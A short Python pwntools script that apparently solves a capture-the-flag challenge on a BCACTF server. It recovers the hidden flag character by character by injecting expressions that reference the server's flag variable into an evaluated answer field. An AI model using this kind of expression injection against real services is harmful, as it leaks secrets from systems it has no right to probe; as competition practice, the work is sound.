from pwn import *
from string import ascii_letters, digits


chars = ascii_letters + digits + "_!@#$%^&*()-+=[]{}/?\\"
flag = ''
i = 0

r = remote('challs.bcactf.com', 30586)

while True:
    res = r.recv().decode()

    if 'Good job!' in res:
        flag += chars[i - 1]
        i = 0
        print(flag)

    if 'A spring has a spring constant of x' in res:
        r.send(f'{ord(chars[i])}/ord(flag[{len(flag)}])*x*y\n'.encode())
        i += 1
    else:
        r.send('1\n'.encode())
